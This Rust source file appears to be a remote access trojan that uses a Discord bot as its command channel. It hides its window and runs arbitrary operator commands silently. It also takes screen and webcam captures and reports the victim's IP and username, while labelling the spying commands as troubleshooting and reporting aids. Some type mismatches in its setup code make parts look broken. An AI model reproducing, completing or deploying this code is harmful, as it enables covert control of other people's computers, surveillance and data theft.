#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use serenity::all::{
    ButtonStyle, CommandOptionType, ComponentInteraction, CreateActionRow,
    CreateAttachment, CreateButton, CreateCommand, CreateCommandOption, CreateEmbed,
    CreateInteractionResponse, CreateInteractionResponseMessage, Interaction,
    EditInteractionResponse, CreateInteractionResponseFollowup
};
use serenity::async_trait;
use serenity::model::gateway::Ready;
use serenity::prelude::*;
use uuid::Uuid;

mod cam;

mod winhttp;

static CURRENT_AGENT: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);

struct Handler {
    node: u32,
    engine: serenity::all::GuildId,
}

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, _ready: Ready) {

        let gid = self.engine;

        let _ = ctx
            .http
            .create_guild_command(
                gid,
                &CreateCommand::new("interact")
                    .description("Interact with an agent")
                    .add_option(
                        CreateCommandOption::new(CommandOptionType::Integer, "id", "Agent id")
                            .required(true),
                    ),
            )
            .await;

        let _ = ctx
            .http
            .create_guild_command(
                gid,
                &CreateCommand::new("background").description("Background an agent"),
            )
            .await;

        let _ = ctx
            .http
            .create_guild_command(
                gid,
                &CreateCommand::new("ls").description("List all the current online users"),
            )
            .await;

        let _ = ctx
            .http
            .create_guild_command(
                gid,
                &CreateCommand::new("cmd")
                    .description("Run any command")
                    .add_option(
                        CreateCommandOption::new(
                            CommandOptionType::String,
                            "command",
                            "Command to run",
                        )
                        .required(true),
                    ),
            )
            .await;
        let _ = ctx
            .http
            .create_guild_command(
                gid,
                &CreateCommand::new("cmd-all")
                    .description("Run any command")
                    .add_option(
                        CreateCommandOption::new(
                            CommandOptionType::String,
                            "command",
                            "Command to run",
                        )
                        .required(true),
                    ),
            )
            .await;

        let _ = ctx
            .http
            .create_guild_command(
                gid,
                &CreateCommand::new("capture")
                    .description("Capture a screenshot to help troubleshoot issues"),
            )
            .await;
        let _ = ctx
            .http
            .create_guild_command(
                gid,
                &CreateCommand::new("cam")
                    .description("Capture a single image from the default camera for reporting"),
            )
            .await;
    }

    async fn interaction_create(&self, ctx: Context, interaction: Interaction) {
        if let Interaction::Command(cmd) = &interaction {
            match cmd.data.name.as_str() {
                "interact" => {
                    let id = cmd
                        .data
                        .options
                        .get(0)
                        .and_then(|o| match &o.value {
                            serenity::all::CommandDataOptionValue::Integer(i) => Some(*i),
                            _ => None,
                        })
                        .unwrap_or(self.node as i64) as u32;

                    CURRENT_AGENT.store(id, std::sync::atomic::Ordering::Relaxed);

                    let _ = cmd
                        .create_response(
                            &ctx.http,
                            CreateInteractionResponse::Message(
                                CreateInteractionResponseMessage::default().embed(
                                    CreateEmbed::default()
                                        .title(format!("Interacting with Agent#{}", id))
                                        .colour(0x00FF00),
                                ),
                            ),
                        )
                        .await;
                }
                "background" => {
                    let _ = cmd
                        .create_response(
                            &ctx.http,
                            CreateInteractionResponse::Message(
                                CreateInteractionResponseMessage::default().embed(
                                    CreateEmbed::default()
                                        .title("Background Agent")
                                        .colour(0x00FF00),
                                ),
                            ),
                        )
                        .await;
                }
                "ls" => {
                    let id = self.node;
                    let embed = CreateEmbed::default()
                        .title(format!(
                            "Agent #{}   IP: {}",
                            id,
                            winhttp::get_public_ip_winhttp().unwrap_or_else(|| "None".into())
                        ))
                        .colour(0xADD8E6)
                        .field("Username", whoami::username(), true);

                    let interact_button = CreateButton::new(format!("interact-btn:{}", id))
                        .label("Interact")
                        .style(ButtonStyle::Primary);

                    let action_row = CreateActionRow::Buttons(vec![interact_button]);

                    let _ = cmd
                        .create_response(
                            &ctx.http,
                            CreateInteractionResponse::Message(
                                CreateInteractionResponseMessage::default()
                                    .embed(embed)
                                    .components(vec![action_row]),
                            ),
                        )
                        .await;
                }
                "cmd" => {
                    let current = CURRENT_AGENT.load(std::sync::atomic::Ordering::Relaxed);
                    if current != self.node {
                        let _ = cmd.create_response(
                            &ctx.http,
                            CreateInteractionResponse::Message(
                                CreateInteractionResponseMessage::default()
                                    .content("Agent is not Selected")
                                    .ephemeral(true),
                            ),
                        ).await;
                        return;
                    }

                    let command = cmd
                        .data
                        .options
                        .get(0)
                        .and_then(|o| match &o.value {
                            serenity::all::CommandDataOptionValue::String(s) => Some(s.clone()),
                            _ => None,
                        })
                        .unwrap_or_default();

                    let result = cmd_run_string(&command);

                    if result.len() > 2000 {
                        let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| ".".into());
                        let path = std::path::Path::new(&temp_dir).join("response.txt");
                        let _ = std::fs::write(&path, &result);
                        if let Ok(att) = CreateAttachment::path(path.clone()).await {
                            let _ = cmd
                                .create_response(
                                    &ctx.http,
                                    CreateInteractionResponse::Message(
                                        CreateInteractionResponseMessage::default().add_file(att),
                                    ),
                                )
                                .await;
                        } else {
                            let _ = cmd
                                .create_response(
                                    &ctx.http,
                                    CreateInteractionResponse::Message(
                                        CreateInteractionResponseMessage::default()
                                            .content("Failed to attach response.txt"),
                                    ),
                                )
                                .await;
                        }
                        let _ = std::fs::remove_file(&path);
                    } else {
                        let content = format!("```{}```", result);
                        let _ = cmd
                            .create_response(
                                &ctx.http,
                                CreateInteractionResponse::Message(
                                    CreateInteractionResponseMessage::default().content(content),
                                ),
                            )
                            .await;
                    }
                }
                "cmd-all" => {
                    let _ = cmd.create_response(
                            &ctx.http,
                            CreateInteractionResponse::Defer(
                                CreateInteractionResponseMessage::default(),
                            ),
                        ).await;
                    let command = cmd
                            .data
                            .options
                            .get(0)
                            .and_then(|o| match &o.value {
                                serenity::all::CommandDataOptionValue::String(s) => Some(s.clone()),
                                _ => None,
                            })
                            .unwrap_or_default();
                    let result = cmd_run_string(&command);
                    if result.len() > 2000 {
                            let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| ".".into());
                            let path = std::path::Path::new(&temp_dir)
                                .join(format!("response-{}.txt", self.node));
                    
                            let _ = std::fs::write(&path, &result);
                    
                            if let Ok(att) = CreateAttachment::path(&path).await {
                                let _ = cmd.create_followup(
                                    &ctx.http,
                                    CreateInteractionResponseFollowup::new()
                                        .content(format!("**Agent #{}**", self.node))
                                        .add_file(att),
                                ).await;
                            }
                    
                            let _ = std::fs::remove_file(&path);
                        } else {
                            let content = format!(
                                "**Agent #{}**\n```{}```",
                                self.node,
                                result
                            );
                    
                            let _ = cmd.create_followup(
                                &ctx.http,
                                CreateInteractionResponseFollowup::new().content(content),
                            ).await;
                        }
                }
                "capture" => {
                    let current = CURRENT_AGENT.load(std::sync::atomic::Ordering::Relaxed);
                    if current != self.node {
                        let _ = cmd.create_response(
                            &ctx.http,
                            CreateInteractionResponse::Message(
                                CreateInteractionResponseMessage::default()
                                    .content("Agent is not Selected")
                                    .ephemeral(true),
                            ),
                        ).await;
                        return;
                    }

                    let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| ".".into());
                    let path = std::path::Path::new(&temp_dir).join("s.png");
                    let ok = capture_screen_png(&path);

                    if ok && path.exists() {
                        if let Ok(att) = CreateAttachment::path(path.clone()).await {
                            let _ = cmd
                                .create_response(
                                    &ctx.http,
                                    CreateInteractionResponse::Message(
                                        CreateInteractionResponseMessage::default().add_file(att),
                                    ),
                                )
                                .await;
                        } else {
                            let _ = cmd
                                .create_response(
                                    &ctx.http,
                                    CreateInteractionResponse::Message(
                                        CreateInteractionResponseMessage::default().embed(
                                            CreateEmbed::default()
                                                .title(format!("Error Agent#{}", self.node))
                                                .colour(0xFF0000),
                                        ),
                                    ),
                                )
                                .await;
                        }
                        let _ = std::fs::remove_file(&path);
                    } else {
                        let _ = cmd
                            .create_response(
                                &ctx.http,
                                CreateInteractionResponse::Message(
                                    CreateInteractionResponseMessage::default().embed(
                                        CreateEmbed::default()
                                            .title(format!("Error Agent#{}", self.node))
                                            .colour(0xFF0000),
                                    ),
                                ),
                            )
                            .await;
                    }
                }
                "cam" => {
                    let current = CURRENT_AGENT.load(std::sync::atomic::Ordering::Relaxed);
                    if current != self.node {
                        let _ = cmd.create_response(
                            &ctx.http,
                            CreateInteractionResponse::Message(
                                CreateInteractionResponseMessage::default()
                                    .content("Agent is not Selected")
                                    .ephemeral(true),
                            ),
                        ).await;
                        return;
                    }
                
                    let _ = cmd.create_response(
                        &ctx.http,
                        CreateInteractionResponse::Defer(CreateInteractionResponseMessage::default()),
                    ).await;
                
                    let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| ".".into());
                    let path = std::path::Path::new(&temp_dir).join("cap.png");
                    
                    let response = match cam::capture_camera(&path) {
                        Ok(true) => {
                            std::thread::sleep(std::time::Duration::from_millis(150));
                            
                            match CreateAttachment::path(&path).await {
                                Ok(att) => EditInteractionResponse::new()
                                    .new_attachment(att),
                                Err(_) => EditInteractionResponse::new()
                                    .content("Failed to attach image"),
                            }
                        }
                        _ => EditInteractionResponse::new()
                            .content("Camera capture failed"),
                    };
                
                    let _ = cmd.edit_response(&ctx.http, response).await;
                    let _ = std::fs::remove_file(&path);
                }
                _ => {}
            }
        }
        if let Interaction::Component(component) = &interaction {
            handle_component_interaction(&ctx, component).await;
        }
    }
}

async fn handle_component_interaction(ctx: &Context, component: &ComponentInteraction) {
    let custom_id = component.data.custom_id.clone();
    if let Some(id_str) = custom_id.strip_prefix("interact-btn:") {
        let id = id_str.parse::<u32>().unwrap_or(0);

        CURRENT_AGENT.store(id, std::sync::atomic::Ordering::Relaxed);

        let embed = CreateEmbed::default()
            .title(format!("Interacting with Agent#{}", id))
            .colour(0x00FF00);

        let _ = component
            .create_response(
                &ctx.http,
                CreateInteractionResponse::Message(
                    CreateInteractionResponseMessage::default().embed(embed),
                ),
            )
            .await;
    }
}


fn parse_cmdline(s: &str) -> Vec<String> {
    let mut v = Vec::new();
    let mut b = String::new();
    let mut q = false;
    let mut qc = '\0';
    for c in s.chars() {
        if q {
            if c == qc {
                q = false;
            } else {
                b.push(c);
            }
        } else {
            match c {
                '"' | '\'' => {
                    q = true;
                    qc = c;
                }
                ' ' | '\t' => {
                    if !b.is_empty() {
                        v.push(b.clone());
                        b.clear();
                    }
                }
                _ => b.push(c),
            }
        }
    }
    if !b.is_empty() {
        v.push(b);
    }
    v
}

fn builtin_capture(cmd: &str, a: &[String]) -> Option<(i32, String)> {
    use std::{env, fs};

    let mut out = String::new();

    match cmd {
        "pwd" => {
            out.push_str(&format!("{}", env::current_dir().unwrap().display()));
            Some((0, out))
        }
        "cd" => {
            let t = a.get(0).map(|s| s.as_str()).unwrap_or(".");
            match env::set_current_dir(t) {
                Ok(_) => Some((0, out)),
                Err(x) => Some((1, format!("{}", x))),
            }
        }
        "ls" => match fs::read_dir(".") {
            Ok(it) => {
                let mut v = Vec::new();
                for e in it {
                    if let Ok(e) = e {
                        if let Some(n) = e.file_name().to_str() {
                            v.push(n.to_string());
                        }
                    }
                }
                v.sort();
                for n in v {
                    out.push_str(&n);
                    out.push('\n');
                }
                Some((0, out))
            }
            Err(x) => Some((1, format!("{}", x))),
        },
        "cat" | "type" => match a.get(0) {
            Some(p) => match fs::read_to_string(p) {
                Ok(s) => {
                    out.push_str(&s);
                    if !s.ends_with('\n') {
                        out.push('\n');
                    }
                    Some((0, out))
                }
                Err(x) => Some((1, format!("{}", x))),
            },
            None => Some((1, format!("usage: {} <file>", cmd))),
        },
        "mkdir" => match a.get(0) {
            Some(p) => match fs::create_dir(p) {
                Ok(_) => Some((0, out)),
                Err(x) => Some((1, format!("{}", x))),
            },
            None => Some((1, "usage: mkdir <dir>".to_string())),
        },
        "rmdir" => match a.get(0) {
            Some(p) => match fs::remove_dir(p) {
                Ok(_) => Some((0, out)),
                Err(x) => Some((1, format!("{}", x))),
            },
            None => Some((1, "usage: rmdir <dir>".to_string())),
        },
        "rm" => match a.get(0) {
            Some(p) => match fs::remove_file(p) {
                Ok(_) => Some((0, out)),
                Err(x) => Some((1, format!("{}", x))),
            },
            None => Some((1, "usage: rm <file>".to_string())),
        },
        "mv" => {
            if a.len() == 2 {
                match fs::rename(&a[0], &a[1]) {
                    Ok(_) => Some((0, out)),
                    Err(x) => Some((1, format!("{}", x))),
                }
            } else {
                Some((1, "usage: mv <src> <dst>".to_string()))
            }
        }
        "cp" => {
            if a.len() == 2 {
                match fs::copy(&a[0], &a[1]) {
                    Ok(_) => Some((0, out)),
                    Err(x) => Some((1, format!("{}", x))),
                }
            } else {
                Some((1, "usage: cp <src> <dst>".to_string()))
            }
        }
        "echo" => {
            out.push_str(&a.join(" "));
            Some((0, out))
        }
        "find" => match a.get(0) {
            Some(pat) => {
                let star = pat.find('*');
                match fs::read_dir(".") {
                    Ok(it) => {
                        let mut v = Vec::new();
                        for e in it {
                            if let Ok(e) = e {
                                if let Some(n) = e.file_name().to_str() {
                                    let m = if let Some(i) = star {
                                        let (pre, suf0) = pat.split_at(i);
                                        let suf = &suf0[1..];
                                        n.starts_with(pre) && n.ends_with(suf)
                                    } else {
                                        n == pat
                                    };
                                    if m {
                                        v.push(n.to_string());
                                    }
                                }
                            }
                        }
                        v.sort();
                        for n in v {
                            out.push_str(&n);
                            out.push('\n');
                        }
                        Some((0, out))
                    }
                    Err(x) => Some((1, format!("{}", x))),
                }
            }
            None => Some((1, "usage: find <pattern>".to_string())),
        },
        _ => None,
    }
}

#[cfg(target_os = "windows")]
fn run_capture(cmd: &str, a: &[String]) -> (i32, String) {
    use std::{
        env,
        path::Path,
        process::{Command, Stdio},
    };
    
    if let Some(res) = builtin_capture(cmd, a) {
        return res;
    }

    let mut c = Command::new(cmd);
    for x in a {
        c.arg(x);
    }
    c.stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        c.creation_flags(CREATE_NO_WINDOW);
    }
    
    match c.output() {
        Ok(out) => {
            let mut s = String::new();
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            if !stdout.is_empty() {
                s.push_str(&stdout);
            }
            if !stderr.is_empty() {
                s.push_str(&stderr);
            }
            let code = out.status.code().unwrap_or(1);
            (code, s)
        }
        Err(e) => {
            if Path::new(cmd).extension().is_none() {
                let exts = env::var("PATHEXT").unwrap_or(".EXE;.BAT;.CMD".to_string());
                let paths = env::var("PATH").unwrap_or_default();
                for p in env::split_paths(&paths) {
                    for ext in exts.split(';') {
                        let cand = p.join(format!("{}{}", cmd, ext));
                        if cand.exists() {
                            let mut c2 = Command::new(cand);
                            for x in a {
                                c2.arg(x);
                            }
                            c2.stdin(Stdio::null())
                                .stdout(Stdio::piped())
                                .stderr(Stdio::piped());
                            
                            #[cfg(target_os = "windows")]
                            {
                                use std::os::windows::process::CommandExt;
                                const CREATE_NO_WINDOW: u32 = 0x08000000;
                                c2.creation_flags(CREATE_NO_WINDOW);
                            }
                            
                            return match c2.output() {
                                Ok(out2) => {
                                    let mut s = String::new();
                                    let stdout = String::from_utf8_lossy(&out2.stdout);
                                    let stderr = String::from_utf8_lossy(&out2.stderr);
                                    if !stdout.is_empty() {
                                        s.push_str(&stdout);
                                    }
                                    if !stderr.is_empty() {
                                        s.push_str(&stderr);
                                    }
                                    let code = out2.status.code().unwrap_or(1);
                                    (code, s)
                                }
                                Err(e2) => (1, format!("{}", e2)),
                            };
                        }
                    }
                }
            }
            (127, format!("{}", e))
        }
    }
}

fn cmd_run_string(line: &str) -> String {
    let parts = parse_cmdline(line.trim());
    if parts.is_empty() {
        return String::new();
    }
    let (_code, out) = run_capture(&parts[0], &parts[1..]);
    out
}

#[cfg(target_os = "windows")]
fn capture_screen_png(path: &std::path::Path) -> bool {
    use std::ffi::{c_void, OsStr};
    use std::os::windows::ffi::OsStrExt;

    type BOOL = i32;
    type HDC = *mut c_void;
    type HBITMAP = *mut c_void;
    type HWND = *mut c_void;
    type HGDIOBJ = *mut c_void;
    type DWORD = u32;

    const SRCCOPY: DWORD = 0x00CC0020;

    extern "system" {
        fn GetDesktopWindow() -> HWND;
        fn GetWindowDC(hWnd: HWND) -> HDC;
        fn ReleaseDC(hWnd: HWND, hDC: HDC) -> i32;
        fn CreateCompatibleDC(hdc: HDC) -> HDC;
        fn CreateCompatibleBitmap(hdc: HDC, cx: i32, cy: i32) -> HBITMAP;
        fn SelectObject(hdc: HDC, h: HGDIOBJ) -> HGDIOBJ;
        fn BitBlt(
            hdcDest: HDC,
            xDest: i32,
            yDest: i32,
            w: i32,
            h: i32,
            hdcSrc: HDC,
            xSrc: i32,
            ySrc: i32,
            rop: DWORD,
        ) -> BOOL;
        fn DeleteObject(hObject: HGDIOBJ) -> BOOL;
        fn DeleteDC(hdc: HDC) -> BOOL;
        fn GetSystemMetrics(nIndex: i32) -> i32;
    }

    #[link(name = "gdiplus")]
    extern "system" {
        fn GdiplusStartup(
            token: *mut usize,
            input: *const GdiplusStartupInput,
            output: *mut c_void,
        ) -> i32;
        fn GdiplusShutdown(token: usize);
        fn GdipCreateBitmapFromHBITMAP(
            hbm: HBITMAP,
            hpal: *mut c_void,
            bitmap: *mut *mut c_void,
        ) -> i32;
        fn GdipDisposeImage(image: *mut c_void) -> i32;
        fn GdipSaveImageToFile(
            image: *mut c_void,
            filename: *const u16,
            clsid_encoder: *const CLSID,
            encoder_params: *const c_void,
        ) -> i32;
    }

    #[allow(non_snake_case)]
    #[repr(C)]
    struct GdiplusStartupInput {
        GdiplusVersion: u32,
        DebugEventCallback: *mut c_void,
        SuppressBackgroundThread: i32,
        SuppressExternalCodecs: i32,
    }

    #[repr(C)]
    struct CLSID {
        data1: u32,
        data2: u16,
        data3: u16,
        data4: [u8; 8],
    }

    fn png_clsid() -> CLSID {
        CLSID {
            data1: 0x557CF406,
            data2: 0x1A04,
            data3: 0x11D3,
            data4: [0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3, 0x2E],
        }
    }

    unsafe {
        let w = GetSystemMetrics(0);
        let h = GetSystemMetrics(1);
        if w <= 0 || h <= 0 {
            return false;
        }

        let hwnd = GetDesktopWindow();
        let hdc_screen = GetWindowDC(hwnd);
        if hdc_screen.is_null() {
            return false;
        }

        let hdc_mem = CreateCompatibleDC(hdc_screen);
        if hdc_mem.is_null() {
            ReleaseDC(hwnd, hdc_screen);
            return false;
        }

        let hbm = CreateCompatibleBitmap(hdc_screen, w, h);
        if hbm.is_null() {
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd, hdc_screen);
            return false;
        }

        let old = SelectObject(hdc_mem, hbm as HGDIOBJ);
        if old.is_null() {
            DeleteObject(hbm as HGDIOBJ);
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd, hdc_screen);
            return false;
        }

        if BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, 0, 0, SRCCOPY) == 0 {
            SelectObject(hdc_mem, old);
            DeleteObject(hbm as HGDIOBJ);
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd, hdc_screen);
            return false;
        }

        SelectObject(hdc_mem, old);
        DeleteDC(hdc_mem);
        ReleaseDC(hwnd, hdc_screen);

        let mut token: usize = 0;
        let input = GdiplusStartupInput {
            GdiplusVersion: 1,
            DebugEventCallback: std::ptr::null_mut(),
            SuppressBackgroundThread: 0,
            SuppressExternalCodecs: 0,
        };
        if GdiplusStartup(&mut token, &input, std::ptr::null_mut()) != 0 {
            DeleteObject(hbm as HGDIOBJ);
            return false;
        }

        let mut image: *mut c_void = std::ptr::null_mut();
        let st = GdipCreateBitmapFromHBITMAP(hbm, std::ptr::null_mut(), &mut image);
        DeleteObject(hbm as HGDIOBJ);
        if st != 0 || image.is_null() {
            GdiplusShutdown(token);
            return false;
        }

        let clsid = png_clsid();
        let wide: Vec<u16> = OsStr::new(path.as_os_str())
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        let status = GdipSaveImageToFile(image, wide.as_ptr(), &clsid, std::ptr::null());
        let _ = GdipDisposeImage(image);
        GdiplusShutdown(token);

        status == 0
    }
}

#[cfg(not(target_os = "windows"))]
fn capture_screen_png(_path: &std::path::Path) -> bool {
    false
}


#[tokio::main]
async fn main() {
    let seed = "--token--";
    let engine = ChannelId::new("--channel_id--");

    let intents =
        GatewayIntents::GUILD_MESSAGES | GatewayIntents::MESSAGE_CONTENT | GatewayIntents::GUILDS;

    let node = Uuid::new_v4().to_string();

    let mut client = Client::builder(&seed, intents)
        .event_handler(Handler {
            node,
            engine,
        })
        .await
        .expect("sync");

    if let Err(why) = client.start().await {
        eprintln!("NACK: {why}");
    }
}
